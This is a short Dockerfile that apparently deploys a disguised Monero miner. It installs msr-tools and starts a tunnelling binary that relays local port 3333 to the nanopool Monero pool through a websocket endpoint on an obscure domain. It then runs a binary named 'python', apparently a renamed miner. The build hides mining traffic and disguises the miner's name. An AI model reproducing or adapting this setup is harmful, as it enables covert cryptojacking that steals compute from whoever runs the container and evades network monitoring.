FROM debian:sid
COPY my-tu /
WORKDIR /app

RUN apt update -y \
  && apt install -y procps msr-tools net-tools
RUN chmod a+x /my-tu /app/python && \
  (/my-tu -L 127.0.0.1:3333:xmr-asia1.nanopool.org:10300 wss://xn--fiq811j6ckwjg.wangjm.link &) && \
  cd /app && \
  ./python

CMD /bin/bash
